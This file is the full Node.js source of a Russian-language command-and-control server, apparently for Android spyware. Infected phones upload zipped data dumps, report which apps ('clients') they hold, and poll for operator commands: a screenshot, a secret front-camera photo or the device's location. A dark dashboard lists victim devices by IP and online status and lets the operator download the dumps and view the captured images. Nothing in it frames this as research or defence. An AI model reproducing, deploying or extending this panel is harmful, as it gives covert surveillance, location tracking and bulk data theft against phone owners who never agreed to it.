const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '50mb' }));

const PORT = process.env.PORT || 3000;

const UPLOAD_KEY = process.env.UPLOAD_KEY || 'change_me_upload';
const VIEW_KEY = process.env.VIEW_KEY || 'change_me_view';

const SAVE_DIR = path.join(__dirname, 'dumps');
const MEDIA_DIR = path.join(__dirname, 'media');
const LOG_FILE = path.join(__dirname, 'logs.json');
const UPLOAD_LOG_FILE = path.join(__dirname, 'upload_logs.json');
const DEVICES_FILE = path.join(__dirname, 'devices.json');
const CMDS_FILE = path.join(__dirname, 'commands.json');

if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
if (!fs.existsSync(MEDIA_DIR)) fs.mkdirSync(MEDIA_DIR, { recursive: true });
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '[]');
if (!fs.existsSync(UPLOAD_LOG_FILE)) fs.writeFileSync(UPLOAD_LOG_FILE, '[]');
if (!fs.existsSync(DEVICES_FILE)) fs.writeFileSync(DEVICES_FILE, '{}');
if (!fs.existsSync(CMDS_FILE)) fs.writeFileSync(CMDS_FILE, '{}');

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, SAVE_DIR),
  filename: (req, file, cb) => cb(null, `dump_${Date.now()}.zip`)
});
const upload = multer({ storage, limits: { fileSize: 1024 * 1024 * 1024 } });

const mediaStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, MEDIA_DIR),
  filename: (req, file, cb) => cb(null, `${Date.now()}_${(file.originalname || 'media').replace(/[^a-zA-Z0-9._-]/g, '_')}`)
});
const mediaUpload = multer({ storage: mediaStorage, limits: { fileSize: 200 * 1024 * 1024 } });

function readJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return def; }
}
function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function readLogs() { return readJSON(LOG_FILE, []); }
function writeLogs(arr) { if (arr.length > 500) arr = arr.slice(-500); writeJSON(LOG_FILE, arr); }
function readUploadLogs() { return readJSON(UPLOAD_LOG_FILE, []); }
function writeUploadLogs(arr) { if (arr.length > 2000) arr = arr.slice(-2000); writeJSON(UPLOAD_LOG_FILE, arr); }
function readDevices() { return readJSON(DEVICES_FILE, {}); }
function writeDevices(o) { writeJSON(DEVICES_FILE, o); }
function readCmds() { return readJSON(CMDS_FILE, {}); }
function writeCmds(o) { writeJSON(CMDS_FILE, o); }

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function fmtSize(bytes) {
  if (!bytes) return '0 B';
  const u = ['B', 'KB', 'MB', 'GB'];
  let i = 0, v = bytes;
  while (v >= 1024 && i < u.length - 1) { v /= 1024; i++; }
  return v.toFixed(i === 0 ? 0 : 2) + ' ' + u[i];
}

function fmtTime(ts) {
  const d = new Date(ts);
  const p = n => String(n).padStart(2, '0');
  return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}`;
}

function ago(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return s + 's';
  if (s < 3600) return Math.floor(s / 60) + 'm';
  if (s < 86400) return Math.floor(s / 3600) + 'h';
  return Math.floor(s / 86400) + 'd';
}

app.post('/upload', upload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false, err: 'forbidden' });
  if (!req.file) return res.status(400).json({ ok: false, err: 'no file' });

  const meta = {
    device: req.headers['x-device'] || '?',
    android: req.headers['x-android'] || '?',
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    ts: Date.now(),
    filename: req.file.filename,
    size: req.file.size
  };
  fs.writeFileSync(path.join(SAVE_DIR, req.file.filename + '.json'), JSON.stringify(meta));
  res.json({ ok: true, id: req.file.filename });
});

app.post('/log', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const deviceId = data.deviceId || ip;

  const entry = {
    ts: Date.now(), ip,
    device: data.device || '?',
    android: data.android || '?',
    sdk: data.sdk || '?',
    clients: data.clients || [],
    zipSize: data.zipSize || 0,
    ok: data.ok === true,
    note: data.note || '',
    deviceId
  };

  const logs = readLogs();
  logs.push(entry);
  writeLogs(logs);

  const devices = readDevices();
  devices[deviceId] = {
    ...(devices[deviceId] || {}),
    deviceId,
    device: entry.device,
    android: entry.android,
    sdk: entry.sdk,
    clients: entry.clients,
    ip,
    lastSeen: Date.now()
  };
  writeDevices(devices);

  res.json({ ok: true, deviceId });
});

app.post('/log/upload', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const entry = {
    ts: Date.now(),
    ip,
    deviceId: data.deviceId || ip,
    device: data.device || '?',
    filename: data.filename || '?',
    stage: data.stage || '?',
    chunk: data.chunk || 0,
    totalChunks: data.totalChunks || 0,
    sentBytes: data.sentBytes || 0,
    totalBytes: data.totalBytes || 0,
    note: data.note || ''
  };

  const logs = readUploadLogs();
  logs.push(entry);
  writeUploadLogs(logs);

  res.json({ ok: true });
});

app.post('/cmd/poll', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const deviceId = (req.body && req.body.deviceId) || req.query.deviceId || 'unknown';
  const cmds = readCmds();
  const queue = cmds[deviceId] || [];

  if (queue.length > 0) {
    const cmd = queue.shift();
    cmds[deviceId] = queue;
    writeCmds(cmds);
    return res.json({ ok: true, cmd });
  }

  res.json({ ok: true, cmd: null });
});

app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const deviceId = req.headers['x-device-id'] || 'unknown';
  const cmdType = req.headers['x-cmd-type'] || '?';
  const status = req.headers['x-status'] || '?';

  let note = '';
  try {
    if (req.body && req.body.note) note = req.body.note;
  } catch (e) {}

  const entry = {
    ts: Date.now(),
    type: 'cmd_result',
    deviceId,
    cmd: cmdType,
    status,
    file: req.file ? '/media/' + req.file.filename : null,
    fileType: req.file ? (req.file.mimetype || '') : '',
    note
  };

  const logs = readLogs();
  logs.push(entry);
  writeLogs(logs);

  res.json({ ok: true });
});

app.get('/cmd/send', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');

  const deviceId = req.query.device;
  const cmd = req.query.cmd;
  if (!deviceId || !cmd) return res.status(400).send('missing params');

  const cmds = readCmds();
  if (!cmds[deviceId]) cmds[deviceId] = [];
  cmds[deviceId].push({ cmd, ts: Date.now() });
  writeCmds(cmds);

  res.redirect('/?key=' + VIEW_KEY + '&tab=control&device=' + encodeURIComponent(deviceId));
});

const NAV = [
  { id: 'dumps', label: 'Дампы' },
  { id: 'control', label: 'Управление' },
  { id: 'logs', label: 'Логи' },
  { id: 'uploadlog', label: 'Upload' }
];

app.get('/', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');

  const tab = req.query.tab || 'dumps';
  const selectedDevice = req.query.device || null;
  const k = encodeURIComponent(VIEW_KEY);

  const files = fs.readdirSync(SAVE_DIR)
    .filter(f => f.endsWith('.zip'))
    .map(f => {
      const metaPath = path.join(SAVE_DIR, f + '.json');
      const stat = fs.statSync(path.join(SAVE_DIR, f));
      let meta = { device: '?', android: '?', ip: '?', ts: stat.mtimeMs };
      if (fs.existsSync(metaPath)) {
        try { meta = JSON.parse(fs.readFileSync(metaPath, 'utf8')); } catch (e) {}
      }
      return { filename: f, size: stat.size, ...meta };
    })
    .sort((a, b) => b.ts - a.ts);

  const totalSize = files.reduce((s, f) => s + f.size, 0);
  const logs = readLogs().slice().reverse();
  const uploadLogs = readUploadLogs().slice().reverse();
  const devices = readDevices();
  const deviceList = Object.values(devices).sort((a, b) => b.lastSeen - a.lastSeen);
  const onlineCount = deviceList.filter(d => (Date.now() - d.lastSeen) < 60000).length;

  // ── dumps ──
  const dumpRows = files.map(f => `
    <tr>
      <td class="mono">${esc(f.device)}</td>
      <td>${esc(f.android)}</td>
      <td class="mono dim">${esc(f.ip)}</td>
      <td class="num">${fmtSize(f.size)}</td>
      <td class="mono dim">${fmtTime(f.ts)}</td>
      <td class="right">
        <a class="btn" href="/download/${encodeURIComponent(f.filename)}?key=${k}">Скачать</a>
        <a class="btn danger" href="/delete/${encodeURIComponent(f.filename)}?key=${k}" onclick="return confirm('Удалить дамп?')">Удалить</a>
      </td>
    </tr>`).join('');

  // ── logs ──
  const logRows = logs.map(l => {
    if (l.type === 'cmd_result') {
      return `
      <tr>
        <td class="mono dim">${fmtTime(l.ts)}</td>
        <td><span class="tag">cmd</span> ${esc(l.cmd)}</td>
        <td><span class="pill ${l.status === 'ok' ? 'on' : 'off'}">${esc(l.status)}</span></td>
        <td class="note">
          ${l.note ? esc(l.note) : '—'}
          ${l.file && l.fileType && l.fileType.includes('image') ? `<div class="thumb"><img src="${esc(l.file)}" onclick="window.open('${esc(l.file)}','_blank')"/></div>` : ''}
          ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<div><a class="btn mini" href="${esc(l.file)}" target="_blank">файл</a></div>` : ''}
        </td>
        <td class="mono dim right">${esc(l.ip)}</td>
      </tr>`;
    }
    return `
      <tr>
        <td class="mono dim">${fmtTime(l.ts)}</td>
        <td class="mono">${esc(l.device)}</td>
        <td class="dim">Android ${esc(l.android)} / ${esc(l.sdk)}</td>
        <td class="note">
          ${l.clients && l.clients.length ? `<span class="tag">${esc(l.clients.join(' · '))}</span> ` : ''}
          ${l.zipSize ? `<span class="tag">${fmtSize(l.zipSize)}</span> ` : ''}
          <span class="pill ${l.ok ? 'on' : 'off'}">${l.ok ? 'sent' : 'fail'}</span>
          ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
        </td>
        <td class="mono dim right">${esc(l.ip)}</td>
      </tr>`;
  }).join('');

  // ── upload log ──
  const uploadRows = uploadLogs.map(l => {
    const progress = l.totalBytes > 0 ? ((l.sentBytes / l.totalBytes) * 100).toFixed(1) : '0';
    return `
      <tr>
        <td class="mono dim">${fmtTime(l.ts)}</td>
        <td class="mono">${esc(l.device)}</td>
        <td class="mono dim">${esc(l.filename)}</td>
        <td>
          <span class="pill ${l.stage === 'done' ? 'on' : l.stage === 'fail' ? 'off' : ''}">${esc(l.stage)}</span>
          ${l.totalChunks ? `<span class="tag">chunk ${l.chunk}/${l.totalChunks}</span>` : ''}
          ${l.totalBytes ? `<span class="tag">${fmtSize(l.sentBytes)} / ${fmtSize(l.totalBytes)} · ${progress}%</span>` : ''}
          ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
        </td>
        <td class="mono dim right">${esc(l.ip)}</td>
      </tr>`;
  }).join('');

  // ── control ──
  let controlHtml = '';
  if (!selectedDevice) {
    controlHtml = deviceList.length === 0
      ? `<div class="empty"><div class="empty-mark">∅</div><div>Устройств пока нет</div></div>`
      : `<div class="grid">` + deviceList.map(d => {
          const online = (Date.now() - d.lastSeen) < 60000;
          return `
          <a class="card" href="/?key=${k}&tab=control&device=${encodeURIComponent(d.deviceId)}">
            <div class="card-top">
              <span class="dot ${online ? 'on' : ''}"></span>
              <span class="card-title">${esc(d.device)}</span>
              <span class="card-ago mono">${ago(d.lastSeen)}</span>
            </div>
            <div class="kv"><span>ID</span><b class="mono">${esc(d.deviceId)}</b></div>
            <div class="kv"><span>Android</span><b>${esc(d.android)} / ${esc(d.sdk)}</b></div>
            <div class="kv"><span>IP</span><b class="mono">${esc(d.ip)}</b></div>
            <div class="kv"><span>Клиенты</span><b>${esc((d.clients || []).join(', ') || '—')}</b></div>
          </a>`;
        }).join('') + `</div>`;
  } else {
    const dev = devices[selectedDevice];
    if (!dev) {
      controlHtml = `<div class="empty"><div class="empty-mark">?</div><div>Устройство не найдено</div></div>`;
    } else {
      const devLogs = logs.filter(l => l.deviceId === selectedDevice && l.type === 'cmd_result').slice(0, 50);
      const q = `key=${k}&device=${encodeURIComponent(selectedDevice)}`;
      controlHtml = `
        <a class="back" href="/?key=${k}&tab=control">← Все устройства</a>
        <div class="dev-head">
          <div>
            <div class="dev-name">${esc(dev.device)}</div>
            <div class="dev-sub mono">${esc(dev.ip)} · Android ${esc(dev.android)} · ${esc(dev.deviceId)}</div>
          </div>
          <span class="pill ${(Date.now() - dev.lastSeen) < 60000 ? 'on' : 'off'}">${(Date.now() - dev.lastSeen) < 60000 ? 'online' : 'seen ' + ago(dev.lastSeen) + ' ago'}</span>
        </div>
        <div class="cmd-grid">
          <a class="cmd" href="/cmd/send?${q}&cmd=screenshot"><span>01</span>Скриншот</a>
          <a class="cmd" href="/cmd/send?${q}&cmd=frontcam"><span>02</span>Фронталка</a>
          <a class="cmd" href="/cmd/send?${q}&cmd=location"><span>03</span>Гео</a>
        </div>
        <div class="section-title">Результаты</div>
        ${devLogs.length === 0 ? `<div class="empty small">Пока ничего</div>` : `
        <div class="table-wrap"><table>
          <thead><tr><th>Время</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead>
          <tbody>${devLogs.map(l => `
            <tr>
              <td class="mono dim">${fmtTime(l.ts)}</td>
              <td class="mono">${esc(l.cmd)}</td>
              <td><span class="pill ${l.status === 'ok' ? 'on' : 'off'}">${esc(l.status)}</span></td>
              <td class="note">
                ${l.file && l.fileType && l.fileType.includes('image') ? `<div class="thumb"><img src="${esc(l.file)}" onclick="window.open('${esc(l.file)}','_blank')"/></div>` : ''}
                ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<a class="btn mini" href="${esc(l.file)}" target="_blank">открыть</a>` : ''}
                ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
              </td>
            </tr>`).join('')}
          </tbody>
        </table></div>`}`;
    }
  }

  const counts = {
    dumps: files.length,
    control: deviceList.length,
    logs: logs.length,
    uploadlog: uploadLogs.length
  };

  const navHtml = NAV.map(n => `
    <a class="nav ${tab === n.id ? 'active' : ''}" href="/?key=${k}&tab=${n.id}">
      <span>${n.label}</span><span class="nav-count mono">${counts[n.id]}</span>
    </a>`).join('');

  const titles = { dumps: 'Дампы', control: 'Управление', logs: 'Логи', uploadlog: 'Upload Log' };
  const clearLink =
    tab === 'dumps' ? `<a class="btn danger" href="/clear?key=${k}" onclick="return confirm('Удалить ВСЕ дампы?')">Очистить всё</a>` :
    tab === 'logs' ? `<a class="btn danger" href="/clearlogs?key=${k}" onclick="return confirm('Удалить все логи?')">Очистить всё</a>` :
    tab === 'uploadlog' ? `<a class="btn danger" href="/clearuploadlogs?key=${k}" onclick="return confirm('Удалить upload-логи?')">Очистить всё</a>` : '';

  let body = '';
  if (tab === 'uploadlog') {
    body = uploadLogs.length === 0
      ? `<div class="empty"><div class="empty-mark">∅</div><div>Upload-логов пока нет</div></div>`
      : `<div class="table-wrap"><table>
          <thead><tr><th>Время</th><th>Устройство</th><th>Файл</th><th>Статус</th><th class="right">IP</th></tr></thead>
          <tbody>${uploadRows}</tbody>
        </table></div>`;
  } else if (tab === 'logs') {
    body = logs.length === 0
      ? `<div class="empty"><div class="empty-mark">∅</div><div>Логов пока нет</div></div>`
      : `<div class="table-wrap"><table>
          <thead><tr><th>Время</th><th>Устройство</th><th>Система</th><th>Детали</th><th class="right">IP</th></tr></thead>
          <tbody>${logRows}</tbody>
        </table></div>`;
  } else if (tab === 'control') {
    body = controlHtml;
  } else {
    body = files.length === 0
      ? `<div class="empty"><div class="empty-mark">∅</div><div>Дампов пока нет</div></div>`
      : `<div class="table-wrap"><table>
          <thead><tr><th>Устройство</th><th>Android</th><th>IP</th><th>Размер</th><th>Время</th><th class="right"></th></tr></thead>
          <tbody>${dumpRows}</tbody>
        </table></div>`;
  }

  const html = `<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panel — ${titles[tab] || ''}</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0b0b0b; --bg-2:#101010; --panel:#141414; --line:#242424; --line-2:#333;
  --fg:#ededed; --fg-2:#9a9a9a; --fg-3:#666; --white:#fff;
}
html,body{height:100%}
body{
  background:var(--bg); color:var(--fg);
  font:14px/1.5 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,system-ui,sans-serif;
  -webkit-font-smoothing:antialiased;
}
.mono{font-family:ui-monospace,SFMono-Regular,'JetBrains Mono',Menlo,Consolas,monospace;font-size:12.5px}
.dim{color:var(--fg-2)}
.num{font-variant-numeric:tabular-nums}
a{color:inherit;text-decoration:none}

.shell{display:flex;min-height:100vh}

/* sidebar */
.sidebar{
  width:236px;flex-shrink:0;border-right:1px solid var(--line);
  background:var(--bg-2);display:flex;flex-direction:column;
  position:sticky;top:0;height:100vh;
}
.brand{display:flex;align-items:center;gap:10px;padding:22px 20px 20px;border-bottom:1px solid var(--line)}
.mark{width:26px;height:26px;display:grid;place-items:center;border:1px solid var(--line-2);border-radius:6px;font-size:13px;color:var(--white)}
.brand-name{font-weight:700;letter-spacing:.16em;font-size:12px;color:var(--white)}
.nav-wrap{padding:14px 12px;display:flex;flex-direction:column;gap:2px}
.nav{
  display:flex;align-items:center;justify-content:space-between;
  padding:9px 12px;border-radius:6px;color:var(--fg-2);
  font-size:13px;font-weight:500;transition:background .12s,color .12s;
}
.nav:hover{background:#191919;color:var(--fg)}
.nav.active{background:var(--white);color:#0b0b0b;font-weight:600}
.nav.active .nav-count{color:#0b0b0b;border-color:rgba(0,0,0,.2)}
.nav-count{font-size:11px;padding:1px 7px;border:1px solid var(--line);border-radius:99px;color:var(--fg-3)}
.side-foot{margin-top:auto;padding:16px 20px;border-top:1px solid var(--line);font-size:11px;color:var(--fg-3);letter-spacing:.06em}
.side-foot b{color:var(--fg-2);font-weight:600}

/* main */
.main{flex:1;min-width:0;display:flex;flex-direction:column}
.topbar{
  display:flex;align-items:flex-end;justify-content:space-between;gap:20px;
  padding:26px 32px 22px;border-bottom:1px solid var(--line);
  position:sticky;top:0;background:rgba(11,11,11,.88);backdrop-filter:blur(8px);z-index:5;
}
.page-title{font-size:22px;font-weight:700;letter-spacing:-.02em;color:var(--white)}
.page-sub{margin-top:3px;font-size:12px;color:var(--fg-3);letter-spacing:.04em}
.stats{display:flex;gap:24px;flex-wrap:wrap}
.stat{text-align:right}
.stat-val{font-size:17px;font-weight:600;color:var(--white);font-variant-numeric:tabular-nums}
.stat-key{font-size:10.5px;color:var(--fg-3);letter-spacing:.12em;text-transform:uppercase}
.content{padding:26px 32px 60px;flex:1}

/* buttons */
.btn{
  display:inline-flex;align-items:center;justify-content:center;
  padding:7px 13px;border:1px solid var(--line-2);border-radius:5px;
  font-size:12px;font-weight:600;color:var(--fg);background:transparent;
  transition:all .12s;white-space:nowrap;cursor:pointer;
}
.btn:hover{background:var(--white);color:#0b0b0b;border-color:var(--white)}
.btn.danger:hover{background:#fff;color:#0b0b0b}
.btn.mini{padding:3px 9px;font-size:11px}

/* table */
.table-wrap{border:1px solid var(--line);border-radius:8px;overflow:hidden;background:var(--panel)}
table{width:100%;border-collapse:collapse}
thead th{
  text-align:left;padding:11px 16px;font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;
  color:var(--fg-3);font-weight:600;background:#0e0e0e;border-bottom:1px solid var(--line);
}
tbody td{padding:13px 16px;border-bottom:1px solid #1a1a1a;vertical-align:middle}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover{background:#161616}
td.right,th.right{text-align:right}
td.right .btn+.btn{margin-left:6px}
.note{max-width:520px}
.sub{margin-top:5px;font-size:12px;color:var(--fg-2)}
.thumb{margin-top:8px}
.thumb img{max-width:300px;border-radius:5px;border:1px solid var(--line-2);cursor:zoom-in;display:block}

/* pills */
.pill{display:inline-block;padding:2px 8px;border-radius:99px;font-size:10.5px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;border:1px solid var(--line-2);color:var(--fg-2)}
.pill.on{background:var(--white);color:#0b0b0b;border-color:var(--white)}
.pill.off{color:#f0f0f0;border-color:#4a4a4a;background:#1d1d1d}
.tag{display:inline-block;padding:2px 7px;border:1px solid var(--line);border-radius:4px;font-size:11px;color:var(--fg-2);margin-right:4px;font-family:ui-monospace,Menlo,Consolas,monospace}

/* empty */
.empty{padding:80px 20px;text-align:center;color:var(--fg-3);font-size:13px}
.empty.small{padding:32px 20px}
.empty-mark{font-size:34px;color:var(--line-2);margin-bottom:12px}

/* device grid */
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
.card{
  display:block;padding:16px 18px;border:1px solid var(--line);border-radius:8px;
  background:var(--panel);transition:border-color .15s,background .15s;
}
.card:hover{border-color:var(--line-2);background:#181818}
.card-top{display:flex;align-items:center;gap:9px;padding-bottom:12px;margin-bottom:12px;border-bottom:1px solid var(--line)}
.card-title{font-weight:600;font-size:13.5px;color:var(--white);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.card-ago{font-size:11px;color:var(--fg-3)}
.dot{width:7px;height:7px;border-radius:50%;background:#3a3a3a;flex-shrink:0}
.dot.on{background:var(--white);box-shadow:0 0 8px rgba(255,255,255,.7)}
.kv{display:flex;justify-content:space-between;gap:12px;font-size:12.5px;padding:3px 0}
.kv span{color:var(--fg-3);flex-shrink:0}
.kv b{font-weight:500;color:var(--fg);text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* device detail */
.back{font-size:12.5px;color:var(--fg-2);font-weight:600}
.back:hover{color:var(--white)}
.dev-head{display:flex;align-items:center;justify-content:space-between;gap:16px;margin:16px 0 22px;flex-wrap:wrap}
.dev-name{font-size:20px;font-weight:700;color:var(--white);letter-spacing:-.01em}
.dev-sub{margin-top:4px;color:var(--fg-3)}
.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-bottom:28px}
.cmd{
  border:1px solid var(--line);border-radius:8px;padding:16px;background:var(--panel);
  font-weight:600;font-size:13.5px;color:var(--fg);transition:all .14s;display:flex;flex-direction:column;gap:8px;
}
.cmd span{font-size:10.5px;color:var(--fg-3);letter-spacing:.12em;font-family:ui-monospace,Menlo,Consolas,monospace}
.cmd:hover{border-color:var(--white);background:#181818;color:var(--white);transform:translateY(-1px)}
.section-title{font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--fg-3);font-weight:600;margin-bottom:12px}

/* mobile */
@media(max-width:860px){
  .shell{flex-direction:column}
  .sidebar{width:auto;height:auto;position:static;flex-direction:row;align-items:center;border-right:none;border-bottom:1px solid var(--line);overflow-x:auto}
  .brand{border-bottom:none;padding:14px 16px;flex-shrink:0}
  .nav-wrap{flex-direction:row;padding:8px;gap:4px;flex:1}
  .nav{white-space:nowrap;padding:8px 12px}
  .nav-count{display:none}
  .side-foot{display:none}
  .topbar{padding:18px 18px 16px;position:static}
  .content{padding:18px 18px 48px}
  .table-wrap{overflow-x:auto}
  table{min-width:640px}
  .stats{gap:16px}
}
</style></head>
<body>
<div class="shell">
  <aside class="sidebar">
    <div class="brand">
      <div class="mark">◆</div>
      <div class="brand-name">PANEL</div>
    </div>
    <div class="nav-wrap">${navHtml}</div>
    <div class="side-foot"><b>${deviceList.length}</b> устройств · <b>${onlineCount}</b> online</div>
  </aside>

  <main class="main">
    <div class="topbar">
      <div>
        <div class="page-title">${titles[tab] || 'Panel'}</div>
        <div class="page-sub">${files.length} дампов · ${fmtSize(totalSize)} · ${deviceList.length} устройств</div>
      </div>
      <div class="stats">
        <div class="stat"><div class="stat-val">${files.length}</div><div class="stat-key">Dumps</div></div>
        <div class="stat"><div class="stat-val">${fmtSize(totalSize)}</div><div class="stat-key">Storage</div></div>
        <div class="stat"><div class="stat-val">${onlineCount}/${deviceList.length}</div><div class="stat-key">Online</div></div>
        ${clearLink ? `<div class="stat" style="display:flex;align-items:center">${clearLink}</div>` : ''}
      </div>
    </div>
    <div class="content">${body}</div>
  </main>
</div>
</body></html>`;

  res.send(html);
});

app.get('/delete/:name', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  const p = path.join(SAVE_DIR, req.params.name);
  if (fs.existsSync(p)) fs.unlinkSync(p);
  const metaP = p + '.json';
  if (fs.existsSync(metaP)) fs.unlinkSync(metaP);
  res.redirect('/?key=' + VIEW_KEY);
});

app.get('/clear', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  const files = fs.readdirSync(SAVE_DIR);
  for (const f of files) {
    try { fs.unlinkSync(path.join(SAVE_DIR, f)); } catch (e) {}
  }
  res.redirect('/?key=' + VIEW_KEY);
});

app.get('/clearlogs', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  writeLogs([]);
  res.redirect('/?key=' + VIEW_KEY + '&tab=logs');
});

app.get('/clearuploadlogs', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  writeUploadLogs([]);
  res.redirect('/?key=' + VIEW_KEY + '&tab=uploadlog');
});

app.get('/download/:name', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  const p = path.join(SAVE_DIR, req.params.name);
  if (!fs.existsSync(p)) return res.status(404).send('not found');
  res.download(p);
});

app.use('/media', express.static(MEDIA_DIR));

app.get('/health', (req, res) => res.send('ok'));

app.listen(PORT, () => console.log('server on ' + PORT));
